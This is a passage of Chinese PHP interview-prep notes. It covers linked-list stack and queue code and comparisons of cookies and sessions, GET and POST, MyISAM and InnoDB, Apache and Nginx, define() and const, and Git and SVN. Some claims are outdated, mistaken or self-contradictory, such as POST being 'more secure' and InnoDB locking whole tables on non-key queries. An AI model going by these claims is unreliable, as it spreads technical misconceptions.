        public function removeByRecursion( $node , $value, $level=0 ){
               if( $node->next == null ){
                   $this->showDeeep($level,$node->val);
                   return $node->val == $value ? $node->next:$node;
               }
       
               $this->showDeeep($level,$node->val);
               $node->next = $this->removeByRecursion( $node->next,$value,++$level );
               $this->showDeeep($level,$node->val);
               return $node->val == $value ? $node->next:$node;
           }
       
        /**
        * 显示深度
        * 帮助理解递归执行过程，回调函数执行层序遵循系统栈 
        * @param int $level 深度层级
        * @param $val
        * @return bool
        */
        public function showDeeep( $level=1,$val ){
             if( $level<1 ){
                 return false;
             }
    
             while($level--){
                 echo '-';
             }
             echo "$val\n";
        }

}
调用操作如下：

<?php
$node = new Linklist();
$node->addFirst(1);
$node->add(1,7);
$node->add(2,10);
$node->edit(1,8);
var_dump($node->select(1)) ;
$node->delete(1);
$node->addLast(99);
var_dump($node->iscontain(2));
var_export($node);
var_export($node->tostring());
分析下链表操作的时间复杂度：

增： O(n)  只对链表头操作：O(1)

删： O(n)  只对链表头操作：O(1)

改：O(n)

查：O(n)   只对链表头操作：O(1)
利用链表实现栈
<?php
/**
 * 链表实现栈
 * Class LinklistStack
 * @package app\models
 */
class LinklistStack extends Linklist
{
    /**
     * @param $value
     */
    public function push( $value ){
        $this->addFirst($value);
    }

    /**
     * @return mixed
     */
    public function pop(){
        $r = $this->head->next->val;
        $this->delete(0);
        return $r;
    }
}
<?php
        $stack = new LinklistStack();
        $stack->push(1);
        $stack->push(3);
        $stack->push(6);
        $stack->push(9);

        print_r($stack->pop());
        print_r($stack->head);
链表实现队列
image

<?php

/**
 * 链表实现队列
 * Class LinkListQueue
 * @package app\models
 */
class LinkListQueue extends Linklist
{
    public $tail;    //尾节点

    /**
     * push
     * @param $value
     */
    public function push( $value ){

        if( $this->head->val==null ){
            $this->tail = new Node( $value );
            $this->head = $this->tail;
        }else{
            $this->tail->next =  new Node( $value );
            $this->tail = $this->tail->next;
        }
        $this->size++;
    }

    /**
     * pop
     * @return null
     * @throws \Exception
     */
    public function pop(){
        if( $this->size<=0 )
            throw new \Exception('超过链表范围');
        $val = $this->head->val;
        $this->head = $this->head->next;

        $this->size--;
        return $val;
    }

    /**
     * 查看队首
     */
    public function checkHead(){
        return $this->head->val;
    }

    /**
     * 查看队尾
     */
    public function checkEnd(){
        return $this->tail->val;
    }

    /**
     * toString
     */
    public function toString(){
        $r = [];
        while( $this->head ){
            $r[] = $this->head->val;
            $this->head = $this->head->next;
        }
        return implode('->',$r);
    }
}
测试

<?php
$stack = new LinkListQueue();
        $stack->push(1);
        $stack->push(3);
        $stack->push(6);
        $stack->push(9);

        print_r($stack->pop());
        print_r($stack->head);
        print_r($stack->checkHead());
        print_r($stack->checkEnd());
        print_r($stack->toString());
/**        
1
app\models\Node Object
(
    [val] => 3
    [next] => app\models\Node Object
        (
            [val] => 6
            [next] => app\models\Node Object
                (
                    [val] => 9
                    [next] => 
                )
        )
)
3
9
3->6->9
**/
```

## 对比篇
### Cookie 与 Session 区别
cookie数据存放在客户的浏览器上，session数据放在服务器上。

cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session。

session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能， 考虑到减轻服务器性能方面，应当使用COOKIE。

单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。

### `GET` 与 `POST` 区别
1. get是从服务器上获取数据，post是向服务器传送数据。

2. get是把参数数据队列加到提交表单的ACTION属性所指的URL中， 值和表单内各个字段一一对应，在URL中可以看到。 post是通过HTTP post机制，将表单内各个字段与其内容放置在HTML HEADER内 一起传送到ACTION属性所指的URL地址。用户看不到这个过程。

3. get传送的数据量较小，不能大于2KB。post传送的数据量较大， 一般被默认为不受限制。

4. get安全性非常低，post安全性较高。但是执行效率却比Post方法好。

```
|GET|POST|
|-|-|
|后退按钮/刷新无害|数据会被重新提交|
|数据长度限制/URL长度2048字符|长度无限制|
|数据可见/安全性差|不可见/更安全|
|可以被缓存|不可以被缓存|
|书签可收藏|书签不可收藏|
```

### MySQL 各个存储引擎、及区别（一定会问 MyISAM 与 Innodb 区别）
https://blog.csdn.net/qq_27607965/article/details/79925288?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight

InnoDB和MyISAM是很多人在使用MySQL时最常用的两个表类型，这两个表类型各有优劣，5.7之后就不一样了

1、事务和外键

InnoDB具有事务，支持4个事务隔离级别，回滚，崩溃修复能力和多版本并发的事务安全， 包括ACID。如果应用中需要执行大量的INSERT或UPDATE操作，则应该使用InnoDB，这样可以提高多用户并发操作的性能 MyISAM管理非事务表。它提供高速存储和检索，以及全文搜索能力。如果应用中需要执行大量的SELECT查询，那么MyISAM是更好的选择

2、全文索引

Innodb不支持全文索引，如果一定要用的话，最好使用sphinx等搜索引擎。myisam对中文支持的不是很好 不过新版本的Innodb已经支持了

3、锁
mysql支持三种锁定级别，行级、页级、表级;

MyISAM支持表级锁定，提供与 Oracle 类型一致的不加锁读取(non-locking read in SELECTs)

InnoDB支持行级锁，InnoDB表的行锁也不是绝对的，如果在执行一个SQL语句时MySQL不能确定要扫描的范围， InnoDB表同样会锁全表，注意间隙锁的影响

例如update table set num=1 where name like “%aaa%”

4、存储

MyISAM在磁盘上存储成三个文件。第一个文件的名字以表的名字开始，扩展名指出文件类型， .frm文件存储表定义，数据文件的扩展名为.MYD，  索引文件的扩展名是.MYI

InnoDB，基于磁盘的资源是InnoDB表空间数据文件和它的日志文件，InnoDB 表的大小只受限于操作系统文件的大小 注意：MyISAM表是保存成文件的形式，在跨平台的数据转移中使用MyISAM存储会省去不少的麻烦

5、索引

InnoDB（索引组织表）使用的聚簇索引、索引就是数据，顺序存储，因此能缓存索引，也能缓存数据

MyISAM（堆组织表）使用的是非聚簇索引、索引和文件分开，随机存储，只能缓存索引

6、并发

MyISAM读写互相阻塞：不仅会在写入的时候阻塞读取，MyISAM还会在读取的时候阻塞写入，但读本身并不会阻塞另外的读 InnoDB 读写阻塞与事务隔离级别相关

7、场景选择

MyISAM

不需要事务支持（不支持）

并发相对较低（锁定机制问题）

数据修改相对较少（阻塞问题），以读为主

数据一致性要求不是非常高

尽量索引（缓存机制）

调整读写优先级，根据实际需求确保重要操作更优先

启用延迟插入改善大批量写入性能

尽量顺序操作让insert数据都写入到尾部，减少阻塞

分解大的操作，降低单个操作的阻塞时间

降低并发数，某些高并发场景通过应用来进行排队机制

对于相对静态的数据，充分利用Query Cache可以极大的提高访问效率

MyISAM的Count只有在全表扫描的时候特别高效，带有其他条件的count都需要进行实际的数据访问

InnoDB 

需要事务支持（具有较好的事务特性）

行级锁定对高并发有很好的适应能力，但需要确保查询是通过索引完成

数据更新较为频繁的场景

数据一致性要求较高

硬件设备内存较大，可以利用InnoDB较好的缓存能力来提高内存利用率，尽可能减少磁盘 IO

主键尽可能小，避免给Secondary index带来过大的空间负担

避免全表扫描，因为会使用表锁

尽可能缓存所有的索引和数据，提高响应速度

在大批量小插入的时候，尽量自己控制事务而不要使用autocommit自动提交

合理设置innodb_flush_log_at_trx_commit参数值，不要过度追求安全性

避免主键更新，因为这会带来大量的数据移动

8、其它细节

1）InnoDB 中不保存表的具体行数，注意的是，当count(*)语句包含 where条件时，两种表的操作是一样的

2）对于AUTO_INCREMENT类型的字段，InnoDB中必须包含只有该字段的索引，但是在MyISAM表中， 可以和其他字段一起建立联合索引， 如果你为一个表指定AUTO_INCREMENT列， 在数据词典里的InnoDB表句柄包含一个名为自动增长计数器的计数器， 它被用在为该列赋新值。自动增长计数器仅被存储在主内存中，而不是存在磁盘

3）DELETE FROM table时，InnoDB不会重新建立表，而是一行一行的删除

4）LOAD TABLE FROM MASTER操作对InnoDB是不起作用的，解决方法是首先把InnoDB表改成MyISAM表， 导入数据后再改成InnoDB表，但是对于使用的额外的InnoDB特性(例如外键)的表不适用

5）如果执行大量的SELECT，MyISAM是更好的选择，如果你的数据执行大量的INSERT或UPDATE，
出于性能方面的考虑，应该使用InnoDB表

7、为什么MyISAM会比Innodb 的查询速度快 InnoDB 在做SELECT的时候，要维护的东西比MYISAM引擎多很多；

1）InnoDB 要缓存数据和索引，MyISAM只缓存索引块，这中间还有换进换出的减少

2）innodb寻址要映射到块，再到行，MyISAM记录的直接是文件的OFFSET，定位比INNODB要快

3）InnoDB 还需要维护MVCC一致；虽然你的场景没有，但他还是需要去检查和维护

MVCC ( Multi-Version Concurrency Control )多版本并发控制

InnoDB ：通过为每一行记录添加两个额外的隐藏的值来实现MVCC，这两个值一个记录这行数据何时被创建， 另外一个记录这行数据何时过期（或者被删除）。但是InnoDB并不存储这些事件发生时的实际时间， 相反它只存储这些事件发生时的系统版本号。这是一个随着事务的创建而不断增长的数字。

每个事务在事务开始时会记录它自己的系统版本号。每个查询必须去检查每行数据的版本号与事务的版本号是否相同。

让我们来看看当隔离级别是REPEATABLE READ时这种策略是如何应用到特定的操作的

SELECT InnoDB必须每行数据来保证它符合两个条件

1、InnoDB必须找到一个行的版本，它至少要和事务的版本一样老(也即它的版本号不大于事务的版本号)。 这保证了不管是事务开始之前，或者事务创建时，或者修改了这行数据的时候，这行数据是存在的。

2、这行数据的删除版本必须是未定义的或者比事务版本要大。这可以保证在事务开始之前这行数据没有被删除。

8、mysql性能讨论

MyISAM最为人垢病的缺点就是缺乏事务的支持

InnoDB 的磁盘性能很令人担心

MySQL 缺乏良好的 tablespace 

两种类型最主要的差别就是Innodb 支持事务处理与外键和行级锁.

而MyISAM不支持.所以MyISAM往往就容易被人认为只适合在小项目中使用。

我作为使用MySQL的用户角度出发，Innodb和MyISAM都是比较喜欢的， 但是从我目前运维的数据库平台要达到需求：99.9%的稳定性，
方便的扩展性和高可用性来说的话，MyISAM绝对是我的首选。

原因如下：

1、首先我目前平台上承载的大部分项目是读多写少的项目，而MyISAM的读性能是比Innodb强不少的。

2、MyISAM的索引和数据是分开的，并且索引是有压缩的，内存使用率就对应提高了不少。 能加载更多索引，而Innodb是索引和数据是紧密捆绑的，没有使用压缩从而会造成Innodb比MyISAM体积庞大不小。

3、从平台角度来说，经常隔1，2个月就会发生应用开发人员不小心update一个表where写的范围不对， 导致这个表没法正常用了，这个时候MyISAM的优越性就体现出来了，随便从当天拷贝的压缩包取出对应表的文件， 随便放到一个数据库目录下，然后dump成sql再导回到主库，并把对应的binlog补上。如果是Innodb， 恐怕不可能有这么快速度，别和我说让Innodb定期用导出xxx.sql机制备份， 因为我平台上最小的一个数据库实例的数据量基本都是几十G大小。

4、从我接触的应用逻辑来说，select count(*) 和order by 是最频繁的，大概能占了整个sql总语句的60%以上的操作， 而这种操作Innodb其实也是会锁表的，很多人以为Innodb是行级锁，那个只是where对它主键是有效，非主键的都会锁全表的。

5、还有就是经常有很多应用部门需要我给他们定期某些表的数据，MyISAM的话很方便，只要发给他们对应那表的frm.MYD,MYI的文件， 让他们自己在对应版本的数据库启动就行，而Innodb就需要导出xxx.sql了，因为光给别人文件，受字典数据文件的影响，对方是无法使用的。

6、如果和MyISAM比insert写操作的话，Innodb还达不到MyISAM的写性能，如果是针对基于索引的update操作， 虽然MyISAM可能会逊色Innodb,但是那么高并发的写，从库能否追的上也是一个问题，还不如通过多实例分库分表架构来解决。

7、如果是用MyISAM的话，merge引擎可以大大加快应用部门的开发速度，他们只要对这个merge表做一些select count(*)操作， 非常适合大项目总量约几亿的rows某一类型(如日志，调查统计)的业务表。 当然Innodb也不是绝对不用，用事务的项目如模拟炒股项目，我就是用Innodb的，活跃用户20多万时候，也是很轻松应付了， 因此我个人也是很喜欢Innodb的，只是如果从数据库平台应用出发，我还是会首选MyISAM。 另外，可能有人会说你MyISAM无法抗太多写操作，但是我可以通过架构来弥补，说个我现有用的数据库平台容量： 主从数据总量在几百T以上，每天十多亿 pv的动态页面，还有几个大项目是通过数据接口方式调用未算进pv总数， (其中包括一个大项目因为初期memcached没部署,导致单台数据库每天处理 9千万的查询)。 而我的整体数据库服务器平均负载都在0.5-1左右。 

MyISAM索引实现

MyISAM引擎使用B+Tree作为索引结构，叶节点的data域存放的是数据记录的地址。如图： 

MyISAM主键索引

这里设表一共有三列，假设我们以Col1为主键，则上图是一个MyISAM表的主索引（Primary key）示意。

可以看出MyISAM的索引文件仅仅保存数据记录的地址。在MyISAM中，主索引和辅助索引（Secondary key）在结构上没有任何区别， 只是主索引要求key是唯一的，而辅助索引的key可以重复。如果我们在Col2上建立一个辅助索引，则此索引的结构如下图所示： 

MyISAM辅助索引

同样也是一颗B+Tree，data域保存数据记录的地址。因此，MyISAM中索引检索的算法为首先按照B+Tree搜索算法搜索索引， 如果指定的Key存在，则取出其data域的值，然后以data域的值为地址，读取相应数据记录。 

MyISAM的索引方式也叫做“非聚集”的，之所以这么称呼是为了与InnoDB的聚集索引区分。

InnoDB索引实现

虽然InnoDB也使用B+Tree作为索引结构，但具体实现方式却与MyISAM截然不同。

第一个重大区别是InnoDB的数据文件本身就是索引文件。从上文知道，MyISAM索引文件和数据文件是分离的， 索引文件仅保存数据记录的地址。而在InnoDB中，表数据文件本身就是按B+Tree组织的一个索引结构，

这棵树的叶节点data域保存了完整的数据记录。这个索引的key是数据表的主键，因此InnoDB表数据文件本身就是主索引。

InnoDB主索引

上图是InnoDB主索引（同时也是数据文件）的示意图，可以看到叶节点包含了完整的数据记录。

这种索引叫做聚集索引。因为InnoDB的数据文件本身要按主键聚集，所以InnoDB要求表必须有主键（MyISAM可以没有）， 如果没有显式指定，则MySQL系统会自动选择一个可以唯一标识数据记录的列作为主键，如果不存在这种列， 则MySQL自动为InnoDB表生成一个隐含字段作为主键，这个字段长度为6个字节，类型为长整形。

第二个与MyISAM索引的不同是InnoDB的辅助索引data域存储相应记录主键的值而不是地址。换句话说， InnoDB的所有辅助索引都引用主键作为data域。例如，下图为定义在Col3上的一个辅助索引： 

InnoDB辅助索引

这里以英文字符的ASCII码作为比较准则。聚集索引这种实现方式使得按主键的搜索十分高效， 但是辅助索引搜索需要检索两遍索引：首先检索辅助索引获得主键，然后用主键到主索引中检索获得记录。

总结

在数据库开发中，了解不同存储引擎的索引实现方式对于正确使用和优化索引都非常有帮助。

例如，知道了InnoDB的索引实现后，就很容易明白为什么不建议使用过长的字段作为主键，因为所有辅助索引都引用主索引， 过长的主索引会令辅助索引变得过大。再例如，用非单调的字段作为主键在InnoDB中不是个好做法， 因为InnoDB数据文件本身是一颗B+Tree，非单调的主键会造成在插入新记录时数据文件为了维持B+Tree的特性而频繁的分裂调整， 十分低效，而使用自增字段作为主键则是一个很好的选择。

### HTTP 与 HTTPS 区别
```
||http|https|
-|-|-
端口|80|443
内容|明文传输|加密传输
安全|无状态|需要安全证书

HTTPS 约等于 HTTP+SSL
- 优点
相对安全/SEO排名更高
- 缺点
证书需要申请，服务器资源占用更高，连接建立需要传送证书，速度更慢.
```

### Apache 与 Nginx 区别
Nginx

轻量级，采用 C 进行编写，同样的 web 服务，会占用更少的内存及资源

抗并发，nginx 以 epoll and kqueue 作为开发模型，处理请求是异步非阻塞的，负载能力比 apache 高很多，

而 apache 则是阻塞型的。在高并发下 nginx 能保持低资源低消耗高性能 ，
j
而 apache 在 PHP 处理慢或者前端压力很大的情况下，很容易出现进程数飙升，从而拒绝服务的现象。

nginx 处理静态文件好，静态处理性能比 apache 高三倍以上

nginx 的设计高度模块化，编写模块相对简单

nginx 配置简洁，正则配置让很多事情变得简单，而且改完配置能使用 -t 测试配置有没有问题，apache 配置复杂 ，重启的时候发现配置出错了，会很崩溃

nginx 作为负载均衡服务器，支持 7 层负载均衡

nginx 本身就是一个反向代理服务器，而且可以作为非常优秀的邮件代理服务器

启动特别容易, 并且几乎可以做到 7*24 不间断运行，即使运行数个月也不需要重新启动，还能够不间断服务的情况下进行软件版本的升级

社区活跃，各种高性能模块出品迅速

Apache

apache 的 rewrite 比 nginx 强大，在 rewrite 频繁的情况下，用 apache

apache 发展到现在，模块超多，基本想到的都可以找到

apache 更为成熟，少 bug ，nginx 的 bug 相对较多

apache 超稳定

apache 对 PHP 支持比较简单，nginx 需要配合其他后端用

apache 在处理动态请求有优势，nginx 在这方面是鸡肋，一般动态请求要 apache 去做，nginx 适合静态和反向。

apache 仍然是目前的主流，拥有丰富的特性，成熟的技术和开发社区

总结

两者最核心的区别在于 apache 是同步多进程模型，一个连接对应一个进程，

而 nginx 是异步的，多个连接（万级别）可以对应一个进程

一般来说，需要性能的 web 服务，用 nginx 。如果不需要性能只求稳定，更考虑 apache ，后者的各种功能模块实现得比前者，

例如 ssl 的模块就比前者好，可配置项多。epoll(freebsd 上是 kqueue ) 网络 IO 模型是 nginx 处理性能高的根本理由，

但并不是所有的情况下都是 epoll 大获全胜的，如果本身提供静态服务的就只有寥寥几个文件，

apache 的 select 模型或许比 epoll 更高性能。当然，这只是根据网络 IO 模型的原理作的一个假设，

真正的应用还是需要实测了再说的。

更为通用的方案是，前端 nginx 抗并发，后端 apache 集群，配合起来会更好。

### define() 与 const 区别
在PHP中定义常量时，可用const与define这两种方式，那他们到底有什么区别呢？

1. const用于类成员变量定义，一旦定义且不能改变其值。define定义全局常量，在任何地方都可以访问。

2. define不能定义在类中，而const必须定义在类中，并且const定义的变量必须通过类名::变量名来进行访问。

3. const不能在条件语句中定义常量。

4. const采用一个普通的常量名称（静态的标量），define可以采用任何表达式作为名称。

5. const 总是大小写敏感，然而define()可以通过第三个参数来定义大小写不敏感的常量。

6. 使用const简单易读，它本身是一个语言结构，而define是一个方法，用const定义在编译时比define快很多。

如果在类中定义常量，不能用define，而用const，如下例：
```
//在类外面通常这样定义常量
define("PHP","111cn.net");
class MyClass
{
    //常量的值将始终保持不变。在定义和使用常量的时候不需要使用$符号
    const constant = 'constant value';
    function showConstant() {
        echo  self::constant . " ";
    }
}
echo MyClass::constant . " ";
$classname = "MyClass";
echo $classname::constant . " "; // PHP 5.3.0之后
$class = new MyClass();
$class->showConstant();
echo $class::constant." "; // PHP 5.3.0之后
//print_r(get_defined_constants());  //可以用get_defined_constants()获取所有定义的常量
?>

```
一般是define在类外定义常量，const在类内定义常量，并且const必须通过类名::变量名来进行访问。
但是php5.3以上支持类外通过const定义常量，看如下，这样是ok的：

```
   const a = "abcdef";
   echo a;
```

关于常量的基础知识，这里不说了，除了以上，define和const的其它区别
1.const不能再条件语句中定义常量，但是define是可以的，如下：
```
if(1){
   const a = 'java';
}   
echo a;  //必错
```

2.const采用一个普通的常量名称，define可以采用表达式作为名称
```
for ($i = 0; $i < 32; ++$i) {
    define('PHP_' . $i, 1 << $i);
}
```
3.const只能接受静态的标量，而define可以采用任何表达式。
```
const PHP = 1 << 5; // 错误
define('PHP', 1 << 5); // 正确
```
4.const本身就是一个语言结构。而define是一个函数。所以使用const速度要快的多。 两者共同点：两者都是不能进行重新赋值。

下面内容摘自Rotted_Pencil的博文：PHP中定义常量的区别，define() vs. const

今天在Stackoverflow又看到一个很有趣的文章，所以翻译过后摘了过来。 文章是由PHP开发成员之一的NikiC写的，权威性自然毋庸置疑

在PHP5.3中，有两种方法可以定义常量：

1.使用const关键字

2.使用define()方法
```
const FOO = ‘BAR’;

define(‘FOO’,’BAR’);
```
这两种方式的根本区别在于const会在代码编译时定义一个常量， 而define则是在代码运行时才定义一个常量。这就使得const会有以下几个缺点： const不能在条件语句中使用。如果要定义一个全局变量，const必须要处于整个代码的最外层：
```
if (...) {   
    const FOO = 'BAR';    // 无效的
}
// but
if (...) {
   define('FOO', 'BAR'); // 有效的
}
```
你可以能会问为什么我要这么做？一个最平常的例子是当你在检测一个常量是否已经被定义时：
```
if (!defined('FOO')) {
    define('FOO', 'BAR');
}
```
const只能用来声明变量（如数字、字符串，或者true, false, null, FILE），
而define()还能接受表达式。不过在PHP5.6之后const也可以接受常量的表达式了：
```
const BIT_5 = 1 << 5;    // 在PHP5.6之后有效，之前无效
define('BIT_5', 1 << 5); // 一直有效
```
const的常量命名只能用直白的文本，而define()允许你用任何表达式来对常量命名。这样我们就可以执行以下操作：
```
for ($i = 0; $i < 32; ++$i) {
    define('BIT_' . $i, 1 << $i);
}
```
const定义的常量是大小写敏感的，但是define允许你将其第三个参数设置为true来关闭其对大小写的敏感：
```
define('FOO', 'BAR', true);
echo FOO; // BAR
echo foo; // BAR
```
以上就是你需要注意的几点。那么现在我来说明以下，为什么不涉及以上情况下，我个人总是习惯使用const：
const更加易读、美观。
const默认在当前的namespace下定义常量，而使用define则需要你写明整个namespace的完整路径：
```
namespace A\B\C;
// 如果要定义常量 A\B\C\FOO:
const FOO = ‘BAR’;
define(‘A\B\C\FOO’, ‘BAR’);
```
自从PHP5.6后，使用const数组也能被定义为常量。而define目前是不支持这一功能的，但是该功能会在PHP7中被实现：
```
const FOO = [1, 2, 3];    // 在PHP 5.6中有效
define(‘FOO’, [1, 2, 3]); // 在PHP 5.6无效, 在PHP 7.0有效
```
因为const在编译时就被执行了，所以它在速度上要比define快一点。

尤其是在使用define定义大量常量时，PHP的运行速度会变得非常慢。

人们甚至发明了诸如apc_load_constantshide来避免这个问题 与define相比，const能使定义常量的效率提高一倍（在配置有XDebug的开发机器上，这个差异还会更大）。

但是在查询时间上，两者是没有区别的（因为二者用的都是同一个查询表） 最后需要注意的一点是，const可以在class和interface当中使用 ，而define是做不到这一点的：
```
class Foo {
    const BAR = 2; // 有效
}
class Baz {
    define('QUX', 2); // 无效
}
```
总结

除非你需要使用表达式或者在条件语句中定义常量，不然的话仅仅是为了代码的简单可读性你都最好要使用const！

### Git 与 SVN 区别
https://www.cnblogs.com/Sungeek/p/9152223.html

一、 集中式vs分布式

1. Subversion属于集中式的版本控制系统 集中式的版本控制系统都有一个单一的集中管理的服务器，保存所有文件的修订版本，
而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。

Subversion的特点概括起来主要由以下几条：

每个版本库有唯一的URL（官方地址），每个用户都从这个地址获取代码和数据；

获取代码的更新，也只能连接到这个唯一的版本库，同步以取得最新数据；

提交必须有网络连接（非本地版本库）；

提交需要授权，如果没有写权限，提交会失败；

提交并非每次都能够成功。如果有其他人先于你提交，会提示“改动基于过时的版本，先更新再提交”… 诸如此类；

冲突解决是一个提交速度的竞赛：手快者，先提交，平安无事；手慢者，后提交，可能遇到麻烦的冲突解决。

好处：每个人都可以一定程度上看到项目中的其他人正在做些什么。而管理员也可以轻松掌控每个开发者的权限。

缺点：中央服务器的单点故障。

若是宕机一小时，那么在这一小时内，谁都无法提交更新、还原、对比等，也就无法协同工作。

如果中央服务器的磁盘发生故障，并且没做过备份或者备份得不够及时的话，还会有丢失数据的风险。

最坏的情况是彻底丢失整个项目的所有历史更改记录，被客户端提取出来的某些快照数据除外， 但这样的话依然是个问题，你不能保证所有的数据都已经有人提取出来。

Subversion原理上只关心文件内容的具体差异。每次记录有哪些文件作了更新，以及都更新了哪些行的什么内容。

2. Git属于分布式的版本控制系统

Git记录版本历史只关心文件数据的整体是否发生变化。Git 不保存文件内容前后变化的差异数据。

实际上，Git 更像是把变化的文件作快照后，记录在一个微型的文件系统中。每次提交更新时， 它会纵览一遍所有文件的指纹信息并对文件作一快照，然后保存一个指向这次快照的索引。为提高性能， 若文件没有变化，Git 不会再次保存，而只对上次保存的快照作一连接。

在分布式版本控制系统中，客户端并不只提取最新版本的文件快照，而是把原始的代码仓库完整地镜像下来。

这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。

这类系统都可以指定和若干不同的远端代码仓库进行交互。籍此，你就可以在同一个项目中， 分别和不同工作小组的人相互协作。你可以根据需要设定不同的协作流程。

另外，因为Git在本地磁盘上就保存着所有有关当前项目的历史更新，并且Git中的绝大多数操作都只需要访问本地文件和资源， 不用连网，所以处理起来速度飞快。用SVN的话，没有网络或者断开VPN你就无法做任何事情。但用Git的话，就算你在飞机或者火车上， 都可以非常愉快地频繁提交更新，等到了有网络的时候再上传到远程的镜像仓库。换作其他版本控制系统，这么做几乎不可能，抑或是非常麻烦。

Git具有以下特点：

Git中每个克隆(clone)的版本库都是平等的。你可以从任何一个版本库的克隆来创建属于你自己的版本库， 同时你的版本库也可以作为源提供给他人，只要你愿意。

Git的每一次提取操作，实际上都是一次对代码仓库的完整备份。

提交完全在本地完成，无须别人给你授权，你的版本库你作主，并且提交总是会成功。

甚至基于旧版本的改动也可以成功提交，提交会基于旧的版本创建一个新的分支。

Git的提交不会被打断，直到你的工作完全满意了，PUSH给他人或者他人PULL你的版本库， 合并会发生在PULL和PUSH过程中，不能自动解决的冲突会提示您手工完成。

冲突解决不再像是SVN一样的提交竞赛，而是在需要的时候才进行合并和冲突解决。

Git 也可以模拟集中式的工作模式

Git版本库统一放在服务器中

可以为 Git 版本库进行授权：谁能创建版本库，谁能向版本库PUSH，谁能够读取（克隆）版本库

团队的成员先将服务器的版本库克隆到本地；并经常的从服务器的版本库拉（PULL）最新的更新；

团队的成员将自己的改动推（PUSH）到服务器的版本库中，当其他人和版本库同步（PULL）时，会自动获取改变

Git 的集中式工作模式非常灵活

你完全可以在脱离Git服务器所在网络的情况下，如移动办公／出差时，照常使用代码库

你只需要在能够接入Git服务器所在网络时，PULL和PUSH即可完成和服务器同步以及提交

Git提供 rebase 命令，可以让你的改动看起来是基于最新的代码实现的改动

Git 有更多的工作模式可以选择，远非 Subversion可比

二、 版本库与工作区

Subversion的工作区和版本库是截然分开的，而Git的工作区和版本库是如影随形的。

1. SVN的版本库和工作区是分离的

• Subversion 的工作区和版本库物理上分开：Subversion的版本库和工作区是存储在不同路径下， 一般是在不同的主机中，Subversion的企业级部署中，版本库在服务器上， 只能通过 https, http, svn 等协议访问，而不能直接被用户接触到。

• Subversion的工作区是一份版本库在某个历史状态下的快照，如：版本库最新的数据检出到工作区。

• Subversion的工作区中每一个目录下都包含一个名为 .svn 的控制目录（隐藏的目录），该目录的作用是：

① 标识工作区和版本库的对应关系。

② 包含一份该子目录下检出文件的原始拷贝。当文件改动的差异比较或者本地改动的回退时，可以直接参考原始拷贝而无须通过网络访问远程版本库。

• Subversion 的 .svn 控制目录会引入很多麻烦：

① .svn 下的文件原始考本，会导致在目录下按照文件内容搜索时，多出一倍的搜索时间和搜索结果。

② .svn 很容易在集成时，引入产品中，尤其是 Web 应用，将 .svn 目录带入Web服务器会导致安全隐患。

因为一个不允许目录浏览的Web目录，可以通过 .svn/entries 文件查看到该目录下可能存在的文件。

2 .Git 的版本库和工作区如影随形

• Git 的版本库和工作区在同一个目录下，工作区的根目录有一个.git的子目录，这个名为 .git的目录就是版本库本身，

它是Git 用来保存元数据和对象数据库的地方。该目录非常重要，每次克隆镜像仓库的时候， 实际拷贝的就是这个目录里面的数据。所以千万要小心删除这个文件。

• 工作区中其他文件为工作区文件，可能是从 .git 中检出的，或者是要检入的，或者是运行产生的临时文件等。

• 版本库可以脱离工作区而存在，成为 bare（赤裸）版本库。可以用 –bare 参数来创建。但是工作区不能脱离版本库而存在， 即工作区的根目录下必须有一个名为 .git 的版本库克隆文件。

• Git 的版本库因为就在工作区中，能直接被用户接触到。

① 用户可以编辑 .git/config 文件，修改配置，增添新的源

② 用户可以编辑 .git/info/exclude 文件，创建本地忽略…

• Git 的工作区中只在工作区的根目录下有一个 .git 目录，此外再无任何控制目录。Git 工作区下唯一的 .git 目录是版本库， 并非 .svn 的等价物，如果删除了 .git 目录，而又没有该版本库的其他镜像（克隆）的话，你破坏了整个历史，版本库也永远的失去了。

• Git 在本地的 .git 版本库，提供了完全的改动历史。除了和其他人数据交换外，任何版本库相关的操作都在本地完成， 更多的本地操作，避免了冗长的网络延迟，大大节省了时间。例如：查看 log，切换到任何历史版本等操作都无须连接网络。

• Git如何保证安全：本地创建一个Git库，因为工作区和库是在同一个目录中，如果工作区删除了，或者所在的磁盘分区格式化了， 数据不是全都没有了么？其实我们可以这样做：

① 在一个磁盘分区中创建版本库（最好是用 –bare 参数创建），然后在另外的磁盘分区中克隆一个新的作为工作区。

在工作区的提交要不时的PUSH到另外分区的版本库，这样就实现了本地的数据镜像。你甚至可以在本地创建更多的版本库镜像， 安全性要比Subversion的一个库加上一个工作区安全。

② 另一个办法：把你的版本库共享给他人，当他人克隆了你的版本库时，你就拥有了一个异地备份。

三、 全局版本号和全球版本号

SVN的全局版本号和CVS的每个文件都独立维护一套版本号相比，是一个非常大的进步。在看似简单的全局版本号的背后， 是Subversion提供对于事物处理的支持，每一个事物处理（即一次提交）都具有整个版本库全局唯一的版本号。

Git的版本号则更进一步，版本号是全球唯一的。Git 对于每一次提交，通过对文件的内容或目录的结构计算出一个SHA-1 哈希值， 得到一个40位的十六进制字符串，Git将此字符串作为版本号。

1. SVN与Git版本号比较

• 所有保存在Git 数据库中的数据都是用此40位的哈希值作索引的，而不是靠文件名。

• 使用哈希值作版本号的好处就是对于一个分布式的版本控制系统，每个人每次提交后形成的版本号都不会出现重复。

另一好处是保证数据的完整性，因为哈希值是根据内容或目录结构计算出来的，所以我们还可以据此来判断数据内容是否被篡改。

• SVN 的版本号是连续的，可以预判下一个版本号，而 Git 的版本号则不是。

因为 subversion 是集中式版本控制，很容易实现版本号的连续性。Git 是分布式的版本控制系统，而且 Git 采用 40 位长的哈希值作为版本号， 每个人的提交都是各自独立完成的，没有先后之分（即使提交有先后之分，也由于PUSH/PULL的方向和时机而不同）。

Git 的版本号虽然不连续，但是是有线索的，即每一个版本都有对应的父版本（一个或者两个），进而可以形成一个复杂的提交链

• Git 的版本号简化：Git 可以使用从左面开始任意长度的字串作为简化版本号，只要该简化的版本号不产生歧义。

一般采用7位的短版本号（只要不会出现重复的，你也可以使用更短的版本号）。

四、 部分检出

